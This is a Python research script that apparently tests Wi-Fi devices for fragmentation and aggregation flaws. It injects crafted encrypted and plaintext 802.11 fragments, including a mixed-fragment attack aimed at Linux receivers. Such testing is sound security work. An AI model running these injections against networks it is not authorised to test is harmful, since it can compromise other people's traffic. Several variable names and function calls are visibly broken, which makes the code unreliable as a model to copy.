#!/usr/bin/env python3
from libwifi import *
import abc, sys, socket, struct, time, subprocess, atexit, select
from wpaspy import Ctrl

# NOTES:
# - The ath9k_htc devices by default overwrite the injected sequence number.
#   However, this number is not increases when the MoreFragments flag is set,
#   meaning we can inject fragmented frames (albeit with a different sequence
#   number than then one we use for injection this this script).
#   Overwriting the sequence can be avoided by patching `ath_tgt_tx_seqno_normal`
#   and commenting out the two lines that modify `i_seq`.

#MAC_STA2 = "d0:7e:35:d9:80:91"
#MAC_STA2 = "20:16:b9:b2:73:7a"
MAC_STA2 = "80:5a:04:d4:54:c4"

# ---------- Utility Commands ----------

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface. This is not
	# perfect and there may be new unrelated messages after executing this code.
	while ctrl.pending():
		ctrl.recv()

def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, "Failed to execute command %s" % cmd)
		quit(1)
	return rval

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True


class TestOptions():
	Inject_Ping, ForceFrag_EAPOL, Inject_LargeFrag, Attack_LinuxInject, Inject_Frag = range(5)

	def __init__(self):
		self.test = None
		self.interface = None


class Station():
	INIT, ATTACKING, DONE = range(3)

	def __init__(self, daemon, mac, ds_status):
		self.daemon = daemon
		self.options = daemon.options
		self.state = Station.INIT
		self.tk = None
		# TODO: Get the current PN from the kernel, increment by 0x99,
		# and use that to inject packets. Causes less interference.
		# Though perhaps causing interference might be good...
		self.pn = 0x99

		# Contains either the "to-DS" or "from-DS" flag.
		self.FCfield = Dot11(FCfield=ds_status).FCfield

		# MAC address and IP of the station that our script controls.
		# Can be either an AP or client.
		self.mac = mac
		self.ip = None

		# MAC address and IP of the peer station.
		# Can be either an AP or client.
		self.peermac = None
		self.peerip = None

		# To test frame forwarding to a 3rd party
		self.othermac = None
		self.otherip = None

	def handle_mon_rx(self, p):
		pass

	def handle_eth_rx(self, p):
		if self.state == Station.ATTACKING and self.options.test == TestOptions.Inject_Ping:
			# TODO XXX --- Make sure this is not a packet send by us!
			if ARP in p and p[ARP].pdst == self.ip:
				log(STATUS, "Received reply to (fragmented?) ARP request!", color="green")
				self.state = Station.DONE

	def set_header(self, p, forward=False, prior=None):
		"""Set addresses to send frame to the peer or the 3rd party station."""
		# Forward request only makes sense towards the DS/AP
		assert (not forward) or ((p.FCfield & 1) == 0)
		# Priority is only supported in data frames
		assert (prior == None) or (p.type == 2)

		p.FCfield |= self.FCfield
		if prior:
			p.subtype = 8
			p.add_payload(Dot11QoS(TID=prior))

		destmac = self.othermac if forward else self.peermac
		p.addr1 = self.peermac
		p.addr2 = self.mac
		# Here p.FCfield & 1 tests if to-DS is set. Then this fields
		# represents the final destination. Otherwise its the BSSID.
		p.addr3 = destmac if p.FCfield & 1 else self.mac


	def fragattack_linux(self):
		assert self.tk

		payload1 = b"A" * 16
		payload2 = b"B" * 16
		payload3 = b"C" * 16
		seqnum = 0x6AA

		# Frame 1: encrypted normal fragment
		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(payload1)
		self.set_header(frag1)
		frag1 = encrypt_ccmp(frag1, self.tk, self.pn)
		self.pn += 1

		# Frame 2: encrypted fragment with different CS but incremental PN.
		#	   sent fragmented to prevent receiving from processing it.
		frag2 = Dot11(type="Data", SC=((seqnum ^ 1) << 4) | 1)/Raw(payload2)
		self.set_header(frag1)
		frag2 = encrypt_ccmp(frag2, self.tk, self.pn)
		self.pn += 1

		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
		frag3 = Dot11(type="Data", SC=(seqnum << 4) | 1)/Raw(payload3)
		self.set_header(frag1)

		for frag in [frag1, frag2, frag3]:
			self.daemon.inject_mon(frag)

	def send_fragmented(self, header, data, num_frags, tx_repeats=2):
		data = raw(data)
		fragments = []
		fragsize = (len(data) + 1) // num_frags
		for i in range(num_frags):
			frag = header.copy()
			frag.SC |= i
			if i < num_frags - 1:
				frag.FCfield |= Dot11(FCfield="MF").FCfield

			payload = data[fragsize * i : fragsize * (i + 1)]
			frag = frag/Raw(payload)
			if self.tk and i < 20:
				frag = encrypt_ccmp(frag, self.tk, self.pn)
				self.pn += 1
			print(repr(frag))
			fragments.append(frag)

		for i in range(tx_repeats):
			for frag in fragments:
				self.daemon.inject_mon(frag)

	def inject_fragments(self, num_frags=3, size=3000, data=None, prior=None):
		if data is None:
			data = b"A" * size

		seqnum = 0xAA
		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, prior=prior)
		self.send_fragmented(header, data, num_frags)

	def inject_eapol(self, numbytes=16, forward=False):
		# This test is supposed to be executed before authenticating with the AP
		assert self.tk == None

		seqnum = 0xAA
		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, forward)
		data = raw(LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A" * num_bytes))
		self.send_fragmented(header, data, num_frags=1, tx_repeats=2)

	def is_connected(self):
		# We are connected when both peers have an IP address
		return self.ip != None and self.peerip != None

	def handle_connecting(self, peermac):
		self.peermac = peermac

	def handle_eapol_tx(self):
		if self.options == TestOptions.ForceFrag_EAPOL:
			self.inject_eapol(numbytes=32, forward=False)

	def handle_connected(self, ip, peerip):
		self.ip = ip
		self.peerip = peerip
		self.tk = self.daemon.get_tk(self)

		# To allow to key being installed to the kernel by Hostapd
		time.sleep(1)

		if self.options.test == TestOptions.Inject_Ping:
			log(STATUS, "self.mac: " + self.mac)
			log(STATUS, "self.ip: " + self.ip)
			log(STATUS, "self.peermac: " + self.peermac)
			log(STATUS, "self.peerip: " + self.peerip)
			request = ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)

			self.inject_fragments(num_frags=1, data=LLC()/SNAP()/request, prior=2)
			#self.daemon.inject_eth(Ether(src=self.mac, dst=self.peermac)/request)

			self.state = Station.ATTACKING
			log(STATUS, "Transmitted ARP request")
		#if self.options.test == TestOptions.Inject_Frag:
		#	self.inject_fragments(num_frags=1, size=16)
		#elif self.options == TestOptions.Inject_LargeFrag:
		#	self.inject_fragments(num_frags=3, size=3000)


class Daemon():
	def __init__(self, options):
		self.options = options

		# Note: some kernels don't support interface names of 15+ characters
		self.nic_iface = options.interface
		self.nic_mon = "mon" + self.nic_iface[:12]

		self.process = None
		self.sock_eth = None
		self.sock_mon = None

	@abc.abstractmethod
	def start_daemon(self):
		pass

	def configure_daemon(self):
		pass

	def handle_mon_rx(self, p):
		pass

	def handle_eth_rx(self, p):
		pass

	@abc.abstractmethod
	def get_tk(self, station):
		pass

	# TODO: Might be good to put this into libwifi?
	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def inject_mon(self, p):
		self.sock_mon.send(p)

	def inject_eth(self, p):
		self.sock_eth.send(p)

	def run(self):
		self.configure_interfaces()
		self.start_daemon()
		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)

		if False:
			time.sleep(8)
			self.mac = "11:11:11:11:11:11"
			self.ip = "192.168.100.1"
			self.peermac = "22:22:22:22:22:22"
			self.peerip = "192.168.100.2"
			request = ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)
			#self.inject_fragments(num_frags=1, data=LLC()/SNAP()/request)
			self.inject_eth(Ether(src=self.mac, dst=self.peermac)/request)
			quit(1)

		# Open the wpa_supplicant or hostapd control interface
		try:
			self.wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.wpaspy_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise

		# XXX --- Move to Hostapd --- Configure things for the specific test we are running
		if self.options.test == TestOptions.ForceFrag_EAPOL:
			# Intercept EAPOL packets that the client wants to send
			wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
		self.configure_daemon()

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock_mon, self.sock_eth, self.wpaspy_ctrl.s], [], [], 1)
			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if p != None: self.handle_mon_rx(p)

			if self.sock_eth in sel[0]:
				p = self.sock_eth.recv()
				if p != None and Ether in p: self.handle_eth_rx(p)

			if self.wpaspy_ctrl.s in sel[0]:
				msg = self.wpaspy_ctrl.recv()
				self.handle_wpaspy(msg)

	def stop(self):
		log(STATUS, "Closing Hostap daemon and cleaning up ...")
		if self.process:
			self.process.terminate()
			self.process.wait()
		if self.sock_eth: self.sock_eth.close()
		if self.sock_mon: self.sock_mon.close()


class Authenticator(Daemon):
	def __init__(self, options):
		super().__init__(options)

		self.apmac = None
		self.sock_eth = None
		self.dhcp = None
		self.arp_sender_ip = None
		self.arp_sock = None
		self.stations = dict()

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET_TK " + station.peermac)
		if tk == "none":
			return None
		else:
			return bytes.fromhex(tk)

	def handle_eth_rx(self, p):
		# Ignore clients not connected to the AP
		clientmac = p[Ether].src
		if not clientmac in self.stations:
			return

		# Let clients get IP addresses
		self.dhcp.reply(p)
		self.arp_sock.reply(p)

		# Raise event when client is assigned an IP address
		station = self.stations[clientmac]
		if DHCP in p and not station.is_connected() and clientmac in self.dhcp.leases:
			req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
			# This assures we only mark it was connected after receiving a DHCP Request
			if req_type == 3:
				# TODO: We should wait a bit until the peer received the DHCP Ack ...
				peerip = self.dhcp.leases[clientmac]
				log(STATUS, "Client %s with IP %s has connected" % (clientmac, peerip))
				station.handle_connected(self.arp_sender_ip, peerip)

		station.handle_eth_rx(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "is connecting" in msg:
			p = re.compile("Client (.*) is connecting")
			clientmac = p.search(msg).group(1)
			if not clientmac in self.stations:
				station = Station(self, self.apmac, "from-DS")
				self.stations[clientmac] = station

			log(STATUS, "Client %s is connecting" % clientmac)
			station = self.stations[clientmac]
			station.handle_connecting(clientmac)

	def start_daemon(self):
		log(STATUS, "Starting hostapd ...")
		try:
			self.process = subprocess.Popen([
				"../hostapd/hostapd",
				"-i", self.nic_iface,
				"hostapd.conf", "-dd"
			])
			time.sleep(1)
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd?")
			raise

		self.apmac = scapy.arch.get_if_hwaddr(self.nic_iface)

	def configure_daemon(self):
		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='mathyvanhoef.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our ARP ping and replies
		self.arp_sender_ip = self.dhcp.pool.pop()
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.arp_sender_ip, ARP_addr=self.apmac)
		log(STATUS, "Will inject ARP packets using sender IP %s" % self.arp_sender_ip)


class Supplicant(Daemon):
	def __init__(self, options):
		super().__init__(options)
		self.station = None

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
		if tk == "none":
			return None
		else:
			return bytes.fromhex(tk)

	def handle_eth_rx(self, p):
		# TODO XXX --- Also handle ARP replies?

		# TODO XXX --- Raise connected event when we are assigned an IP address
		#self.station.handle_connected()

		pass

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "Trying to authenticate with" in msg:
			p = re.compile("Trying to authenticate with (.*) \(SSID")
			peermac = p.search(msg).group(1)
			self.station.handle_connecting(peermac)

		elif "CTRL-EVENT-CONNECTED" in msg:
			# TODO: Create a timer in case retransmissions are needed
			req = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")
			req = dhcp/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"])
			self.sock_eth.send(req)

		elif "EAPOL-TX" in msg and self.options.test == TestOptions.ForceFrag_EAPOL:
			self.station.handle_eapol_tx()

	def start_daemon(self):
		log(STATUS, "Starting wpa_supplicant ...")
		try:
			self.process = subprocess.Popen([
				"../wpa_supplicant/wpa_supplicant",
				"-Dnl80211",
				"-i", self.nic_iface,
				"-cclient.conf",
				"-dd"])
			time.sleep(1)
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant?")
			raise

		clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		self.station = Station(self, clientmac, "to-DS")


def cleanup():
	daemon.stop()


if __name__ == "__main__":
	if "--help" in sys.argv or "-h" in sys.argv:
		print("\nSee README.md for usage instructions.")
		quit(1)

	options = TestOptions()
	options.interface = sys.argv[1]

	if False:
		# Parse the type of test variant to execute
		start_ap = argv_pop_argument("--ap")
		force_frag = argv_pop_argument("--force-frag")
		inject_largefrag = argv_pop_argument("--largefrag")
		attack_linux = argv_pop_argument("--attack-linux")
		if force_frag + inject_largefrag + attack_linux > 1:
			print("You can only select one test")
			quit(1)
		if force_frag:
			options.test = TestOptions.ForceFrag_EAPOL
		elif inject_largefrag:
			options.test = TestOptions.Inject_LargeFrag
		elif attack_linux:
			options.test = TestOptions.Attack_LinuxInject
		else:
			options.test = TestOptions.Inject_Frag

		# Parse remaining options
		while argv_pop_argument("--debug"):
			libwifi.global_log_level -= 1

	else:
		options.test = TestOptions.Inject_Ping
		start_ap = True

	# Now start the tests
	if start_ap:
		daemon = Authenticator(options)
	else:
		daemon = Supplicant(options)
	atexit.register(cleanup)
	daemon.run()

